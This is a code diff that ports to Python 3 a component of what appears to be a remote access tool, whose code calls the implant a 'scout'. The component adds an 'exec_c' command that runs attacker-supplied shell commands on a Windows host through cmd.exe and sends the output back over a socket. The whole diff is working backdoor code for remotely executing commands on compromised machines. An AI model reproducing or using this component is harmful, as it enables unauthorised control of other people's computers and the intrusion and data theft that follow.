@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -14,20 +13,20 @@ def exec_c(execute):
     if execute[:3] == 'cd ':
         execute = execute.replace('cd ', '', 1)
         chdir(execute)
-        s.sendall("[+]Changed to directory : " + execute)
+        s.sendall(("[+]Changed to directory : " + execute).encode())
     else:
         result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                        stdin=PIPE)
         result = result.stdout.read() + result.stderr.read()        
-        s.sendall('[+]Command output : \\n' + result)''')
+        s.sendall(('[+]Command output : \\n' + result.decode()).encode())''')
         config.logics.append('''
             elif command == "exec_c":
                 exec_c(data)''')
         config.help_menu[
-            'exec_c <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd'
+            'exec_c <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd.exe'
     elif option == 'info':
-        print '\nName             : Execute command CMD component' \
+        print('\nName             : Execute command CMD component' \
               '\nOS               : Windows' \
               '\nRequired Modules : subprocess' \
               '\nCommands         : exec_c <shell command>' \
-              '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd\n'
+              '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using cmd\n')
